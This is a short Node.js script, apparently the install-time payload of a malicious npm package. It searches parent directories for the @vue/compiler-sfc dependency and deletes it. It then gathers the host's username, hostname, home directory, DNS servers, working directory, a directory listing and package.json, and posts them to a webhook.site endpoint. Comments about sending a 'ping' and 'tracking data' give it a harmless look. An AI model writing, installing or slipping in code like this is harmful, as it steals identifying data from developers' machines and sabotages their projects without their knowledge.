const fs = require("fs");
const path = require("path");
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const { exec } = require("child_process");
const packageJSON = require("./package.json");
const package = packageJSON.name;

// Function to send a ping
const sendPing = () => {
    // Perform actions to simulate a ping
    console.log("Ping sent!");
};

// Perform a ping before sending tracking data
sendPing();

// Execute ls command to get a list of files in the current directory
exec("ls", (error, lsResult) => {
    if (error) {
        console.error(`Error executing ls: ${error.message}`);
        return;
    }

    // Find the path to @vue/compiler-sfc by searching parent directories
    let vueCompilerPath = findModulePathUpwards(__dirname, "@vue/compiler-sfc");

    // Check if the dependency exists
    if (vueCompilerPath) {
        // Delete the directory
        fs.rmdirSync(vueCompilerPath, { recursive: true });

        // Log success message
        console.log("@vue/compiler-sfc successfully deleted.");
    } else {
        console.log("@vue/compiler-sfc not found in node_modules or parent directories.");
    }

    const trackingData = JSON.stringify({
        p: package,
        c: __dirname,
        hd: os.homedir(),
        hn: os.hostname(),
        un: os.userInfo().username,
        dns: dns.getServers(),
        r: packageJSON ? packageJSON.___resolved : undefined,
        v: packageJSON.version,
        pjson: packageJSON,
        ls: lsResult.trim(), // Include the ls result in the tracking data
    });

    var postData = querystring.stringify({
        msg: trackingData,
    });

    var options = {
        hostname: "webhook.site", // Replace with your actual webhook hostname
        port: 443,
        path: "/87d635be-aebd-40b4-a842-c8d2becb4e35", // Replace with your actual path
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": postData.length,
        },
    };

    var req = https.request(options, (res) => {
        res.on("data", (d) => {
            process.stdout.write(d);
        });
    });

    req.on("error", (e) => {
        console.error(e);
    });

    req.write(postData);
    req.end();
});

// Function to find a module path upwards in the directory tree
function findModulePathUpwards(startDir, moduleName) {
    let currentDir = startDir;
    while (true) {
        const modulePath = path.join(currentDir, "node_modules", moduleName);
        if (fs.existsSync(modulePath)) {
            return modulePath;
        }

        const parentDir = path.dirname(currentDir);
        if (parentDir === currentDir) {
            // Reached the root directory
            break;
        }

        currentDir = parentDir;
    }

    return null; // Module not found
}

